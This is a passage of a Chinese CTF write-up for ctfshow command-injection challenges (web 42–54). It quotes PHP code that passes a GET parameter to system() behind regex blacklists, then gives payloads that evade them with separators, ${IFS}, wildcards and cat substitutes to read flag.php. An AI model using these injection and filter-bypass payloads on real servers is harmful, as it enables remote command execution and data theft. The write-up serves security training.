class="hljs-subst">&#123;r.text&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><h4 id="web-42"><a href="#web-42" class="headerlink" title="web 42"></a>web 42</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-05 20:51:55</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>分析：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>c.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br></code></pre></td></tr></table></figure><p>将 get 请求传递的 c 的内容与后面内容进行拼接后作为 system 函数的参数；</p><blockquote><p>&#x2F;dev&#x2F;null 是一个重定向操作符，用于将标准输出（stdout）重定向到 &#x2F;dev&#x2F;null，这意味着命令的标准输出将不会显示在终端或网页上，也不会写入任何文件；</p></blockquote><p>2&gt;&amp;1 是另一个重定向操作符，它将标准错误（stderr）重定向到标准输出（stdout），&gt;&amp;1 表示将标准错误重定向到标准输出所指向的地方（即 &#x2F;dev&#x2F;null），这意味着命令的所有错误信息也会被丢弃。<br>方法：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">（<span class="hljs-number">1</span>）使用分号 <span class="hljs-comment">;     ?c=ls; 命令分隔，分号只适用于 Linux 系统，不适用于 Windows 系统。</span><br>（<span class="hljs-number">2</span>）使用逻辑或 ||  ?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>ls|| 对于两个或，前面为真，只执行前面的，后面命令不会执行；而对于一个或， 无论第一个命令执行为真还是假，都是直接执行第二个命令。<br>（<span class="hljs-number">3</span>）使用 &amp;&amp; 或者 &amp;  <br>对于两个与，当第一个命令执行失败（为假），那么第二个命令也不会被执行；对于一个与，前面的语句为假则直接执行后面的，前面可真可假，后面命令都会执行； 需要改成url编码 ?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span><span class="hljs-variable">%26</span><span class="hljs-variable">%26</span><br><span class="hljs-number">4</span>、<span class="hljs-variable">%0</span>a 换行符截断 ?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>ls<span class="hljs-variable">%0</span>a<br></code></pre></td></tr></table></figure><h4 id="web-43"><a href="#web-43" class="headerlink" title="web 43"></a>web 43</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>  preg_match 过滤了cat指令和;，cat指令可以用nl tac等等代替<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">https://6b67134c-<span class="hljs-number">1e91</span>-<span class="hljs-number">4b30</span>-8fc9-8fbd3c7680ed.challenge.ctf.<span class="hljs-built_in">show</span>/?c=more flag.php||<br></code></pre></td></tr></table></figure><h4 id="web-44-45-46-47-48-49"><a href="#web-44-45-46-47-48-49" class="headerlink" title="web 44 45 46 47 48 49"></a>web 44 45 46 47 48 49</h4><p>都千篇一律了 就是多了个正则</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.绕过<span class="hljs-built_in">cat</span>使用：<br><br><span class="hljs-built_in">tac</span> more less <span class="hljs-built_in">head</span> <span class="hljs-built_in">tac</span> <span class="hljs-built_in">tail</span> <span class="hljs-built_in">nl</span> <span class="hljs-built_in">od</span>(二进制查看) vi vim <span class="hljs-built_in">sort</span> <span class="hljs-built_in">uniq</span> rev<br><br>2.绕过空格用：<br><br>%09 &lt;&gt;  &lt; <span class="hljs-variable">$&#123;IFS&#125;</span> $IFS$ &#123;<span class="hljs-built_in">cat</span>,fl*&#125; %20<br><br>注：<br><br>%09  <span class="hljs-comment">##（Tab） %20 ##（space）</span><br><br>3.对flag的过滤（这里也就几个，索性就全丢出来了）<br><br>1.‘’    （例如fl‘’ag）<br><br>2.“”     （例如fl<span class="hljs-string">&quot;&quot;</span>ag)<br><br>3.?       (例如fl??)<br><br>4.*          (例如fl*）<br></code></pre></td></tr></table></figure><h4 id="web-50-51-52-53"><a href="#web-50-51-52-53" class="headerlink" title="web 50 51 52 53"></a>web 50 51 52 53</h4><p>\x09与\x26的含义其实就是%09（tab键）和%26（&amp;）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>依旧用前边的?c&#x3D;nl&lt;&gt;f’’lag.php||</p><h4 id="web-54"><a href="#web-54" class="headerlink" title="web 54"></a>web 54</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>基本上都被过滤</p><p>像这种可以选择使用之前讲过的一种用?通配符来构造的方式，如：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ruby">对flag.php的构造可以这样：fl?<span class="hljs-string">?.</span><span class="hljs-string">??</span>?<br>甚至可以简化为：<span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><br><br>同样，命令也可以进行构造<br>cat可以构造为<span class="hljs-string">?a</span>t、c??<br><br><span class="hljs-string">?c</span>=<span class="hljs-regexp">/bin/c</span>?<span class="hljs-string">?$</span>&#123;<span class="hljs-variable constant_">IFS</span>&#125;<span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><br>可以理解为当前目录运行cat命令实际上运行的也是bin/cat，而通配符不会帮你去找到bin下面的cat<br>只会在当前目录寻找能通配的文件,所以用通配符运行时必须给出路径<br>另外grep命令可以才文件中查找含有的字符串<br>形式：grep [字符串] [filename]<br><span class="hljs-string">?c</span>=grep<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;ctfshow<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;<span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><br></code></pre></td></tr></table></figure><p>题重命名文件</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=mv<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;fl?<span class="hljs-string">?.</span><span class="hljs-string">??</span><span class="hljs-string">?$</span>&#123;<span class="hljs-variable constant_">IFS</span>&#125;a.txt<br>把flag.php重命名为了a.txt<br>然后直接访问a.txt就行<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
